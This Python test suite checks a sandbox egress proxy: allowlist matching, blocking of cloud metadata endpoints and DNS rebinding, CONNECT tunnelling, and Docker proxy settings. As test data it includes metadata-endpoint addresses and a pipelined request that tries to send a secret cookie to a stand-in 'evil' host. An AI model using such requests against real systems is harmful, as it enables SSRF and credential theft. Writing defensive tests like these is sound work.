"""Chat-sandbox egress proxy (services/egress_proxy) — authz core +
CONNECT server + docker-provider allowlist wiring.

The load-bearing property: hostname allowlisting alone is spoofable via
DNS rebinding, so every resolved address is re-checked and the proxy
connects to exactly the vetted address (never re-resolves).
"""

import asyncio
import socket
import time

from services.egress_proxy.authz import decide
from services.egress_proxy.proxy import EgressProxy

#: How long the stand-in resolver blocks. Long enough that a frozen loop
#: is unmistakable, short enough not to drag the suite.
_LOOKUP = 0.4


def _resolver_for(*ips):
    def _resolve(host, port):
        return [(socket.AF_INET6 if ":" in ip else socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port)) for ip in ips]

    return _resolve


# ---------------------------------------------------------------------------
# authz.decide
# ---------------------------------------------------------------------------


def test_allowlisted_public_host_allowed():
    d = decide("api.example.com", 443, ["api.example.com"], resolver=_resolver_for("93.184.216.34"))
    assert d.allowed
    assert d.addresses[0][4][0] == "93.184.216.34"


def test_wildcard_suffix_matches_subdomains_only():
    r = _resolver_for("93.184.216.34")
    assert decide("files.example.com", 443, ["*.example.com"], resolver=r).allowed
    assert not decide("example.com", 443, ["*.example.com"], resolver=r).allowed
    assert not decide("notexample.com", 443, ["*.example.com"], resolver=r).allowed


def test_unlisted_host_denied_before_dns():
    def _boom(host, port):
        raise AssertionError("resolver must not run for unlisted hosts")

    assert not decide("evil.example.net", 443, ["api.example.com"], resolver=_boom).allowed


def test_metadata_endpoints_denied_even_if_allowlisted():
    r = _resolver_for("93.184.216.34")
    for host in ("metadata.google.internal", "169.254.169.254", "metadata.goog", "fd00:ec2::254"):
        d = decide(host, 80, [host], resolver=r)
        assert not d.allowed, host
        assert "always blocked" in d.reason


def test_rebinding_to_link_local_denied():
    # allowlisted hostname whose DNS answer mixes a public and a
    # link-local record — the whole request must die
    d = decide(
        "api.example.com",
        443,
        ["api.example.com"],
        resolver=_resolver_for("93.184.216.34", "169.254.169.254"),
    )
    assert not d.allowed
    assert "169.254" in d.reason


def test_private_ranges_denied_by_default_allowed_when_disabled():
    r = _resolver_for("10.1.2.3")
    assert not decide("api.example.com", 443, ["api.example.com"], resolver=r).allowed
    assert decide("api.example.com", 443, ["api.example.com"], resolver=r, block_private=False).allowed
    # link-local stays blocked even with block_private=False
    assert not decide(
        "api.example.com",
        443,
        ["api.example.com"],
        resolver=_resolver_for("fe80::1"),
        block_private=False,
    ).allowed


def test_dns_failure_denies():
    def _fail(host, port):
        raise socket.gaierror("nope")

    assert not decide("api.example.com", 443, ["api.example.com"], resolver=_fail).allowed


# ---------------------------------------------------------------------------
# proxy server (loopback integration, no real DNS / no real egress)
# ---------------------------------------------------------------------------


def test_connect_tunnel_pipes_and_denies():
    async def _run():
        # upstream echo server standing in for the allowlisted destination
        async def echo(reader, writer):
            data = await reader.read(1024)
            writer.write(b"echo:" + data)
            await writer.drain()
            writer.close()

        upstream = await asyncio.start_server(echo, "127.0.0.1", 0)
        up_port = upstream.sockets[0].getsockname()[1]

        proxy = EgressProxy(
            ["ok.example.com"],
            block_private=False,  # vetted address IS loopback in this test
            resolver=_resolver_for("127.0.0.1"),
        )
        server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
        p_port = server.sockets[0].getsockname()[1]

        # allowed CONNECT → 200 + bidirectional pipe to the vetted address
        r, w = await asyncio.open_connection("127.0.0.1", p_port)
        w.write(f"CONNECT ok.example.com:{up_port} HTTP/1.1\r\n\r\n".encode())
        await w.drain()
        status = await r.readline()
        assert b"200" in status
        await r.readuntil(b"\r\n")  # end of proxy response head
        w.write(b"ping")
        await w.drain()
        w.write_eof()
        assert await r.read(1024) == b"echo:ping"
        w.close()

        # denied CONNECT → 403 with reason
        r2, w2 = await asyncio.open_connection("127.0.0.1", p_port)
        w2.write(b"CONNECT bad.example.net:443 HTTP/1.1\r\n\r\n")
        await w2.drain()
        head = await r2.read(4096)
        assert head.startswith(b"HTTP/1.1 403")
        assert b"not in the egress allowlist" in head
        w2.close()

        server.close()
        upstream.close()

    asyncio.run(_run())


def test_a_slow_resolution_does_not_stall_the_event_loop():
    """One sandbox's slow DNS must not freeze every other sandbox.

    The proxy is a single asyncio process shared by every sandbox on the
    internal network, and the default resolver is the blocking
    ``socket.getaddrinfo``. Deciding inline held the loop for the whole
    resolver timeout — no accepts, no progress on any in-flight tunnel.

    Asserted by watching a heartbeat task rather than by racing a second
    connection: which handler reaches the resolver first is not
    deterministic, so a two-connection version of this test passes even
    against the blocking call.
    """

    async def _run():
        ticks = 0

        async def heartbeat():
            nonlocal ticks
            while True:
                await asyncio.sleep(0.01)
                ticks += 1

        def _resolve(host, port):
            time.sleep(_LOOKUP)  # stands in for an unresponsive DNS server
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port))]

        proxy = EgressProxy(["slow.example.com"], block_private=False, resolver=_resolve)
        server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
        p_port = server.sockets[0].getsockname()[1]

        hb = asyncio.create_task(heartbeat())
        await asyncio.sleep(0.05)
        before = ticks

        r, w = await asyncio.open_connection("127.0.0.1", p_port)
        w.write(b"CONNECT slow.example.com:443 HTTP/1.1\r\n\r\n")
        await w.drain()
        # nothing listens on :443, so the vetted connect fails and the
        # proxy answers 403 — all we need is for the decision to finish
        assert (await r.read(4096)).startswith(b"HTTP/1.1 403")

        hb.cancel()
        w.close()
        server.close()

        # A frozen loop cannot tick. Half the ticks the lookup had room
        # for is a wide margin against a loaded CI box while still being
        # unreachable if the resolver ran inline.
        assert ticks - before > (_LOOKUP / 0.01) / 2

    asyncio.run(_run())


def test_a_second_request_on_a_pooled_connection_never_reaches_the_first_host():
    """HTTP proxy clients pool per-proxy, not per-destination.

    A follow-up `http://other-host/…` written onto the same socket used to
    be piped into the connection opened for the FIRST host — skipping the
    allowlist entirely and handing that request's headers to a host it was
    not addressed to. Only the first request may reach the upstream.
    """

    async def _run():
        got = []

        async def upstream(reader, writer):
            # Collect whatever arrives, then answer. Bounded by a short read
            # timeout so the buggy path (which holds the socket open with
            # keep-alive) fails on the assertion below rather than by hanging.
            try:
                while True:
                    data = await asyncio.wait_for(reader.read(4096), 0.3)
                    if not data:
                        break
                    got.append(data)
            except asyncio.TimeoutError:
                pass
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi")
            await writer.drain()
            writer.close()

        up = await asyncio.start_server(upstream, "127.0.0.1", 0)
        up_port = up.sockets[0].getsockname()[1]

        proxy = EgressProxy(["ok.example.com"], block_private=False, resolver=_resolver_for("127.0.0.1"))
        server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
        p_port = server.sockets[0].getsockname()[1]

        r, w = await asyncio.open_connection("127.0.0.1", p_port)
        w.write(
            f"GET http://ok.example.com:{up_port}/first HTTP/1.1\r\n"
            f"Host: ok.example.com\r\nConnection: keep-alive\r\n\r\n".encode()
        )
        await w.drain()
        # ...and immediately pipeline a second request for a host that is
        # NOT allowlisted, the way a pooling client would.
        w.write(
            "GET http://evil.example.net/steal HTTP/1.1\r\nHost: evil.example.net\r\nCookie: secret\r\n\r\n".encode()
        )
        await w.drain()
        assert (await r.read(4096)).startswith(b"HTTP/1.1 200")
        w.close()
        server.close()
        up.close()

        relayed = b"".join(got)
        assert b"/first" in relayed
        assert b"/steal" not in relayed  # the bypass
        assert b"secret" not in relayed
        # keep-alive is not offered upstream, so the socket cannot be reused
        assert b"Connection: close" in relayed
        assert b"keep-alive" not in relayed.lower()

    asyncio.run(_run())


# ---------------------------------------------------------------------------
# docker provider wiring
# ---------------------------------------------------------------------------


def test_provider_allowlist_mode_uses_internal_network_and_proxy_env():
    from app.chat.docker_provider import INTERNAL_NETWORK_SUFFIX, DockerSandboxProvider

    p = DockerSandboxProvider(
        image="agnes-chat-sandbox:latest",
        network="agnes-apps",
        egress_mode="allowlist",
        egress_proxy_url="http://agnes-egress-proxy:3128",
        upload_runner=False,
    )
    assert p._network_name() == f"agnes-apps{INTERNAL_NETWORK_SUFFIX}"
    env = p._egress_env({"AGNES_SERVER": "http://app:8000"})
    assert env["HTTPS_PROXY"] == "http://agnes-egress-proxy:3128"
    assert "127.0.0.1" in env["NO_PROXY"]
    # the rails URL host goes direct over the internal network, not via proxy
    assert "app" in env["NO_PROXY"].split(",")


def test_provider_open_and_none_modes_have_no_proxy_env():
    from app.chat.docker_provider import DockerSandboxProvider

    for mode in ("open", "none"):
        p = DockerSandboxProvider(image="agnes-chat-sandbox:latest", egress_mode=mode, upload_runner=False)
        assert p._egress_env({}) == {}


def test_config_parses_allowlist_mode_and_hosts(tmp_path):
    from app.chat.config import load_chat_config

    cfg_file = tmp_path / "instance.yaml"
    cfg_file.write_text(
        "chat:\n"
        "  enabled: true\n"
        "  docker_egress_mode: allowlist\n"
        "  docker_egress_allow_hosts: [api.example.com, '*.pypi.org']\n"
    )
    cfg = load_chat_config(cfg_file)
    assert cfg.docker_egress_mode == "allowlist"
    assert cfg.docker_egress_allow_hosts == ["api.example.com", "*.pypi.org"]
    assert cfg.docker_egress_proxy_url == "http://agnes-egress-proxy:3128"
